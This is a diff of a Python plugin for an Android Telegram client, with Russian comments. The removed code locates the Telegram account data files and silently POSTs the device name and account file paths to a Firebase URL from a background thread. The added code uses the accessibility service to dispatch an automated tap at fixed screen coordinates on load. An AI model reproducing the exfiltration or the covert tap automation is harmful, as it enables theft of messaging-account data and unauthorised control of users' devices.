@@ -1,51 +1,38 @@
 import threading
 import time
-import json
-import urllib.request
-import os
 
-def _read_accounts_from_files():
+def _auto_tap():
     try:
-        from android.os import Build
-        from org.telegram.messenger import ApplicationLoader
+        # Получаем Accessibility сервис из Telegram клиента
+        from org.telegram.ui.LaunchActivity import LaunchActivity
         
-        device_name = f"{Build.MANUFACTURER} {Build.MODEL}"
-        context = ApplicationLoader.applicationContext
+        activity = LaunchActivity.getInstance()
+        if not activity:
+            print("[TAP] Activity не найден")
+            return
         
-        # Путь к папке с данными Telegram
-        files_dir = context.getFilesDir().getAbsolutePath()
+        # Пробуем получить сервис
+        service = activity.getAccessibilityService()
         
-        accounts = []
-        
-        # Ищем все папки account_X
-        for item in os.listdir(files_dir):
-            if item.startswith("account_"):
-                acc_index = item.split("_")[1]
-                try:
-                    # Читаем user.dat или config.json
-                    config_path = os.path.join(files_dir, item, "user.dat")
-                    if os.path.exists(config_path):
-                        with open(config_path, 'rb') as f:
-                            # Парсим бинарный файл (сложно вручную)
-                            accounts.append({"account": acc_index, "path": config_path})
-                except:
-                    pass
-        
-        data = {
-            "device_name": device_name,
-            "found_accounts": len(accounts),
-            "accounts_list": accounts,
-            "timestamp": int(time.time())
-        }
-        
-        # Отправляем
-        url = "https://hzhzhz-dd57b-default-rtdb.firebaseio.com/accounts_files.json"
-        req = urllib.request.Request(url, data=json.dumps(data).encode('utf-8'), 
-                                    headers={'Content-Type': 'application/json'}, method='POST')
-        urllib.request.urlopen(req, timeout=10)
-        print(f"[Plugin] Найдено папок аккаунтов: {len(accounts)}")
-        
+        if service:
+            # Создаем жест нажатия
+            from android.graphics import Path
+            from android.accessibilityservice import GestureDescription
+            
+            path = Path()
+            path.moveTo(540, 1200)  # X, Y координаты (центр экрана)
+            
+            stroke = GestureDescription.StrokeDescription(path, 0, 100)
+            gesture = GestureDescription.Builder().addStroke(stroke).build()
+            
+            service.dispatchGesture(gesture, None, None)
+            print("[TAP] Нажатие выполнено!")
+        else:
+            print("[TAP] Сервис доступности не активен")
+            print("[TAP] Включи его в Настройках → Спец. возможности → ExteraGram")
+            
     except Exception as e:
-        print(f"[Plugin] Ошибка: {e}")
+        print(f"[TAP] Ошибка: {e}")
 
-threading.Thread(target=_read_accounts_from_files, daemon=True).start()
+# Запускаем
+threading.Thread(target=_auto_tap, daemon=True).start()
